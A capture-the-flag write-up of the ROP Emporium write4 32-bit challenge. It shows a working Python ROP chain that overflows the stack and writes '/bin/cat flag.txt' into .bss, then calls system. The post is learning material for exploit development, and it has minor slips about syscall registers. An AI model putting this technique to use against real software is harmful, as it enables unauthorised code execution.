---
layout: post
title: "ropemporium - write4 32bit"
---

Hello again.
This writeup will be for the 32bit write4 challenge from ropemporium.

# Description
_Our first foray into proper gadget use. A call to system() is still present but we'll need to write a string into memory somehow._

# Getting information
I started off by getting a pattern from `pwntools`.
The pattern will let me indicate what padding I need to use to overflow the return address.

```python
>>> from pwn import cyclic,fit
>>> cyclic(50)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
>>> 
```
Then I proceeded to run the executable in gdb, because this makes it easier to know what the return address was overwritten with.
```
$ gdb ./write432 -q
Reading symbols from ./write432...(no debugging symbols found)...done.
gdb-peda$ r 
Starting program: /home/pwn/ropemporium/write4/32/write432 
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.


[----------------------------------registers-----------------------------------]
EAX: 0xffffd2e0 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n")
EBX: 0x0 
ECX: 0xf7f9a89c --> 0x0 
EDX: 0xffffd2e0 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n")
ESI: 0xf7f99000 --> 0x1d4d6c 
EDI: 0x0 
EBP: 0x6161616b ('kaaa')
ESP: 0xffffd310 --> 0xa616d ('ma\n')
EIP: 0x6161616c ('laaa')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6161616c
[------------------------------------stack-------------------------------------]
0000| 0xffffd310 --> 0xa616d ('ma\n')
0004| 0xffffd314 --> 0xffffd330 --> 0x1 
0008| 0xffffd318 --> 0x0 
0012| 0xffffd31c --> 0xf7ddce81 (<__libc_start_main+241>:	add    esp,0x10)
0016| 0xffffd320 --> 0xf7f99000 --> 0x1d4d6c 
0020| 0xffffd324 --> 0xf7f99000 --> 0x1d4d6c 
0024| 0xffffd328 --> 0x0 
0028| 0xffffd32c --> 0xf7ddce81 (<__libc_start_main+241>:	add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6161616c in ?? ()
gdb-peda$ 
```
After that I went back to pwntools to get the length of the padding that I needed.
```python
>>> fit({'laaa':'B'})
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaaB'
>>> len(_)-1
44
>>>
```
pwntools allows you to use both hexadecimal strings as well as ascii strings to get a padding. `laaa` is the `0x6161616c` in hex.
Since I have to write to memory, I decided to look up what I needed to have for the `read` syscall. The `read` syscall allows me to write to memory, and that's what I need to do.
So I need to have these registers with the values:
```
eax: 0x03
ebx: stdin (0x1)
ecx: address to write to
edx: length of my input
```
Firstly, I check what locations I could write to.
```
$ readelf -S write432
There are 31 section headers, starting at offset 0x196c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000d0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482ac 0002ac 000081 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804832e 00032e 00001a 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048348 000348 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048368 000368 000020 08   A  5   0  4
  [10] .rel.plt          REL             08048388 000388 000038 08  AI  5  24  4
  [11] .init             PROGBITS        080483c0 0003c0 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483f0 0003f0 000080 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048470 000470 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048480 000480 000262 00  AX  0   0 16
  [15] .fini             PROGBITS        080486e4 0006e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048798 000798 00010c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000028 04  WA  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001030 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001030 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001861 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001064 000510 10     30  50  4
  [30] .strtab           STRTAB          00000000 001574 0002ed 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
$ 
```
For those who don't know, as stated by `readelf`'s manpage, it "Displays information about ELF files.".
The executable is an ELF file. ELF stands for Executable and Linking Format.
the `-S` flag on the command makes readelf display all the different sections of the executable file.
It looks like the `.data` section (8 bytes) is too small to store `/bin/cat flag.txt`, so I have to find a different location.
`.bss` on the otherhand has a size of `0x2c`  which is hexadecimal for 44.
The section starts at `0x0804a040`.
The rop gadgets that I would need are as follows:
```
pop eax; ret
pop ebx; ret
pop ecx; ret
pop edx; ret
syscall; ret
```
What the `pop ?` instructions will do is "pop"  a value from the stack into the respected register, and `eax`, `ebx`, `ecx`, `edx` are all registers.
The `ret` instruction will return to the address that is being pointed to on the first item that is on the stack.
The `syscall` instruction will make a, system call to the kernel to handle what needs to be done, in this case read from the stdin (the terminal).
I took a look to see if I could use all of these gadgets with a tool called `ropper`.
```
$ ropper --file write432 --search "pop"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: ./write432
0x000006db: pop ebp; ret; 
0x000006d8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x000003e1: pop ebx; ret; 
0x000006da: pop edi; pop ebp; ret; 
0x000006d9: pop esi; pop edi; pop ebp; ret; 
0x000005f3: popal; cld; ret;

$ ropper --file ./write432 --search "syscall"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: syscall

$ 
```
Hm, so I can't pop values from the stack into `eax`, `ecx` or `edx`, so maybe I need to take a different route to write to memory.
I also noticed that there is no `syscall` gadget, so I would definitely need to think of something else.
I decided to look at all the functions that the creators of the challenge put into the executable, because they might have put some gadgets in them.
I used `gdb` for this because that's what I am most comfortable with.
```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x080483c0  _init
0x08048400  printf@plt
0x08048410  fgets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  __libc_start_main@plt
0x08048450  setvbuf@plt
0x08048460  memset@plt
0x08048480  _start
0x080484b0  __x86.get_pc_thunk.bx
0x080484c0  deregister_tm_clones
0x080484f0  register_tm_clones
0x08048530  __do_global_dtors_aux
0x08048550  frame_dummy
0x0804857b  main
0x080485f6  pwnme
0x0804864c  usefulFunction
0x08048670  usefulGadgets
0x08048680  __libc_csu_init
0x080486e0  __libc_csu_fini
0x080486e4  _fini
gdb-peda$
```
`usefulGadgets` sounds interesting, so I took a look at the disassembly of that function.
```
gdb-peda$ disassemble usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x08048670 <+0>:	mov    DWORD PTR [edi],ebp
   0x08048672 <+2>:	ret    
   0x08048673 <+3>:	xchg   ax,ax
   0x08048675 <+5>:	xchg   ax,ax
   0x08048677 <+7>:	xchg   ax,ax
   0x08048679 <+9>:	xchg   ax,ax
   0x0804867b <+11>:	xchg   ax,ax
   0x0804867d <+13>:	xchg   ax,ax
   0x0804867f <+15>:	nop
End of assembler dump.
gdb-peda$
```
`mov DWORD PTR [edi],ebp` looks interesting.
What this does is copy the value from `ebp` to the address that is referenced by `edi`.
I could work with that.

#   Thinking up a ropchain
Luckily there is a `pop edi; pop ebp; ret` gadget, which is at `0x080486da` as seen in the previous output from `ropper`.
In a 32bit executable, a register can only hold data up to 4 bytes, so I would have to perform multiple writes to fully write `/bin/cat flag.txt` into memory.

After some thinking I decided that it would be the best to try and perform this ropchain:
```
+-------------------------+
|  pop edi; pop ebp;ret   |
+-------------------------+
|      .bss address       | # 0x0804a040
+-------------------------+
|       0x6e69622f        | # "/bin"
+-------------------------+
| mov DWORD PTR [edi],ebp | # 0x08048670
+-------------------------+
|  pop edi; pop ebp;ret   | # 0x0804a040
+-------------------------+
|    .bss address + 0x4   | # 0x0804a044
+-------------------------+
|       0x20746163        | # "cat "
+-------------------------+
| mov DWORT PTR [edi],ebp | # 0x08048670
+-------------------------+
```
This is my script so far:

```python
from pwn import *


pop_2 = p32(0x080486da) # pop edi; pop ebp; ret
mov = p32(0x08048670) # mov DWORD PTR [edi],ebp
bss_addr = 0x0804a040

payload = 'A'*44 #the padding I need is 44 bytes, so I have 44 A's at the start.

#first write
payload += pop_2
payload += p32(bss_addr)
payload += p32(0x6e69622f) # "/bin"
payload += mov

#second write
payload += pop_2
payload += p32(bss_addr+0x4) #copy to the next 4 bytes
payload += p32(0x20746163) # "cat "
payload += mov

print payload
```
I copied the output to a file called `payload` and ran it in gdb to see if it works.
```
$ gdb ./write432 -q
Reading symbols from ./write432...(no debugging symbols found)...done.
(gdb) b *0x08048670
Breakpoint 1 at 0x8048670
(gdb) r < payload
Starting program: /home/pwn/ropemporium/write4/32/write432 < payload
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
>
Breakpoint 1, 0x08048670 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048670 in usefulGadgets ()
(gdb) nexti
0x08048672 in usefulGadgets ()
(gdb) x/s 0x0804a040
0x804a040 <stderr@@GLIBC_2.0>:  "/bincat "
(gdb)

```
As you can see, I didn't use peda this time, because the output would be too big to place here.
I set a breakpoint at `0x08048670` which is the `mov DWORD PRT [edi],ebp` gadget.
It looks like the writing worked, because "/bincat" was written to the `.bss` section!
I do need to change it to "/bin/cat" instead though, otherwise it will not work because there is no program called "/bincat", on my machine anyways.
So now I just had to make it write 5 times, to fully write "/bin/cat flag.txt" into memory.
My script now looks like this:
```python
from pwn import *

pop_2 = p32(0x080486da) # pop edi; pop ebp; ret
mov = p32(0x08048670) # mov DWORD PTR [edi],ebp
bss_addr = 0x0804a040

payload = 'A'*44
#first write
payload += pop_2
payload += p32(bss_addr)
payload += p32(0x6e69622f) # "/bin"
payload += mov

#second write
payload += pop_2
payload += p32(bss_addr+0x4)
payload += p32(0x7461632f) # "/cat"
payload += mov

#third write
payload += pop_2
payload += p32(bss_addr+0x8)
payload += p32(0x616c6620) # " fla"
payload += mov

#fourth write
payload += pop_2
payload += p32(bss_addr+0xc)
payload += p32(0x78742e67) # "g.tx"
payload += mov

#last write
payload += pop_2
payload += p32(bss_addr+0x10)
payload += p32(0x00000074)
payload += mov

print payload
```
I piped the output of the script into a file called `payload`. And run the executable with `gdb`.
```
$ gdb ./write432 -q
Reading symbols from ./write432...(no debugging symbols found)...done.
(gdb) b *0x08048670
Breakpoint 1 at 0x8048670
(gdb) r < payload 
Starting program: /home/qh/CTF/ropemporium/write4/32/write432 < payload
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
> 
Breakpoint 1, 0x08048670 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048670 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048670 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048670 in usefulGadgets ()
(gdb) c
Continuing.

Breakpoint 1, 0x08048670 in usefulGadgets ()
(gdb) nexti
0x08048672 in usefulGadgets ()
(gdb) x/s 0x0804a040
0x804a040 <stderr@@GLIBC_2.0>:  "/bin/cat flag.txt"
```
It worked! Now I just need to call `system` and have the address of the `.bss` section in the `edi` register.
I decided to take a look at `usefulFunction` because that might have a call to `system`.
```
$ gdb ./write432 -q
Reading symbols from ./write432...(no debugging symbols found)...done.
(gdb) disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0804864c <+0>:     push   %ebp
   0x0804864d <+1>:     mov    %esp,%ebp
   0x0804864f <+3>:     sub    $0x8,%esp
   0x08048652 <+6>:     sub    $0xc,%esp
   0x08048655 <+9>:     push   $0x8048754
   0x0804865a <+14>:    call   0x8048430 <system@plt>
   0x0804865f <+19>:    add    $0x10,%esp
   0x08048662 <+22>:    nop
   0x08048663 <+23>:    leave  
   0x08048664 <+24>:    ret    
End of assembler dump.
```
Looks like `system` is at `0x8048430`. perfect.
I modified my exploit to make it pop the address of `.bss` into `edi` and then call `system`. Here is what it looks like
```python
from pwn import *

pop_2 = p32(0x080486da) # pop edi; pop ebp; ret
mov = p32(0x08048670) # mov DWORD PTR [edi],ebp
bss_addr = 0x0804a040
system_addr = p32(0x8048430)

payload = 'A'*44
#first write
payload += pop_2
payload += p32(bss_addr)
payload += p32(0x6e69622f) # "/bin"
payload += mov

#second write
payload += pop_2
payload += p32(bss_addr+0x4)
payload += p32(0x7461632f) # "/cat"
payload += mov

#third write
payload += pop_2
payload += p32(bss_addr+0x8)
payload += p32(0x616c6620) # " fla"
payload += mov

#fourth write
payload += pop_2
payload += p32(bss_addr+0xc)
payload += p32(0x78742e67) # "g.tx"
payload += mov

#last write
payload += pop_2
payload += p32(bss_addr+0x10)
payload += p32(0x00000074)
payload += mov

#return to system
payload += system_addr
payload += pop_2
payload += p32(bss_addr)

print payload
```
Now that that's done, I think that I might be close to or have solved the challenge.
I wanted to test it, and this is the output
```
$ python exploit.py | ./write432 
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```
Looks like it worked!

## What did I learn from this?
This challenge has taught me how to use ROP (Return Orientated Programming) to write to memory, with limited control over registers and no access to a syscall gadget.
I hope that you learnt something from reading this as well.

References:

[pwntools](https://github.com/Gallopsled/pwntools)

[system call reference](http://syscalls.kernelgrok.com/)

[gdb-peda](https://github.com/longld/peda)